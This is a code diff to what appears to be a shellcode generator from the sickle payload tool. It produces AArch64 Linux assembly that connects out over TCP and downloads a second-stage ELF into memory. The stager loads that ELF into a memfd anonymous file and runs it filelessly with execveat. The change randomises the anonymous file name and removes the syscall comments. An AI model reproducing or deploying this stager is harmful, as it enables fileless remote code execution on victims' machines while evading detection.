@@ -2,6 +2,7 @@ import sys
 import math
 import ctypes
 import struct
+import random
 
 from sickle.common.lib.generic import extract
 from sickle.common.lib.generic import convert
@@ -74,8 +75,8 @@ class Shellcode():
 
         self.arg_list = arg_object["positional arguments"]
 
-        self.sock_buffer_size = 0x500
-        self.anon_file = 0x41414141
+        self.sock_buffer_size = 0x400
+        self.anon_file = random.randint(0x00, 0xFFFFFFFF)
 
         sc_args = {
             "mapping"    : 0x00,
@@ -146,12 +147,6 @@ _start:
     sub sp, sp, #{self.stack_space}
 
 create_allocation:
-    // x8 => mmap(void addr[.length], // x0 => Kernel knows whats best, let em decide
-    //            size_t length,      // x1 => Size of initial allocation
-    //            int prot,           // x2 => (PROT_READ | PROT_WRITE)
-    //            int flags,          // x3 => MAP_PRIVATE | MAP_ANONYMOUS)
-    //            int fd,             // x4 => Create anonymous mapping
-    //            off_t offset);      // x5 => Offset
     eor x0, x0, x0
     mov x1, #{self.sock_buffer_size}
     mov x2, #{bits_mman_linux.PROT_READ | bits_mman_linux.PROT_WRITE}
@@ -164,8 +159,6 @@ create_allocation:
     str x0, [x29, #-{self.storage_offsets['mapping']}]
 
 create_sockfd:
-    //              int type,      // x1 => SOCK_STREAM
-    //              int protocol); // x2 => IPPROTO_TCP
     mov x0, #{bits_socket.AF_INET}
     mov x1, #{bits_socket.SOCK_STREAM}
     mov x2, #{netinet_in.IPPROTO_TCP}
@@ -174,8 +167,6 @@ create_sockfd:
     str x0, [x29, #-{self.storage_offsets['sockfd']}]
 
 connect:
-    //               const struct sockaddr *addr,  // x1 => sockaddr struct
-    //               socklen_t addrlen;            // x2 => sizeof(sockaddr struct)
     sub x1, x29, {self.storage_offsets['addr']}
 
     mov x0, #0x02
@@ -230,9 +221,6 @@ connect:
 
 
             source_code += f"""
-    // x8 = write(int fd,                 // x0
-    //            const void buf[.count], // x1
-    //            size_t count);          // x2
     strb w0, [x29, #-{write_index}]
     ldr x0, [x29, #-{self.storage_offsets['sockfd']}]
     sub x1, x29, #{self.storage_offsets['buffer']}
@@ -247,10 +235,6 @@ set_index:
     eor x14, x14, x14
 
 download_stager:
-    // x8 => read(int fd,        // x0 => sockfd
-    //            void *buf      // x1 => Anywhere on the stack
-    //            size_t count); // x2 => 0x500
-
     ldr x0, [x29, #-{self.storage_offsets['sockfd']}]
     sub x1, x29, #{self.storage_offsets['readBuffer']}
     mov x2, #{self.sock_buffer_size}
@@ -279,12 +263,6 @@ check_size:
     b.eq download_complete
 
 realloc:
-    // x8 => mremap(void old_address,    // x0 => *last_alloc
-    //              size_t old_size,     // x1 => sizeof(last_alloc)
-    //              size_t new_size,     // x2 => sizeof(new_alloc)
-    //              int flags,           // x3 => MREMAP_MAYMOVE
-    //              void *new_address);  // x4 => &out
-
     ldr x0, [x29, #-{self.storage_offsets['mapping']}]
     mov x1, x14
     mov x13, x14
@@ -303,9 +281,6 @@ download_complete:
     str x14, [x1]
 
 create_memory_file:
-    // x8 => memfd_create(const char *name,     // x0 => *buffer
-    //                     unsigned int flags); // x1 => MFD_CLOEXEC (0x01)
-
     sub x9, x29, #{self.storage_offsets['anon_file']}
     eor x0, x0, x0
     str x0, [x9]
@@ -320,10 +295,6 @@ create_memory_file:
     str x0, [x1]
 
 write_to_file:
-    // x8 = write(int fd,                  // x0 => fd
-    //            const void buf[.count],  // x1 => *elf
-    //            size_t count);           // x2 => sizeof(elf)
-
     ldr x0, [x29, #-{self.storage_offsets['anonfd']}]
     ldr x1, [x29, #-{self.storage_offsets['mapping']}]
     ldr x2, [x29, #-{self.storage_offsets['elf_size']}]
@@ -331,11 +302,6 @@ write_to_file:
     svc #0x1337
 
 execute_elf:
-    // x8 = execveat(int dirfd,                     // x0 => File descriptor of anonymous mapping
-    //               const char *pathname,          // x1 => Empty string
-    //               char *const _Nullable argv[],  // x2 => []
-    //               char *const _Nullable envp[],  // x3 => addr
-    //               int flags);                    // x4 => AT_EMPTY_PATH
     ldr x0, [x29, #-{self.storage_offsets['anonfd']}]
 
     eor x5, x5, x5
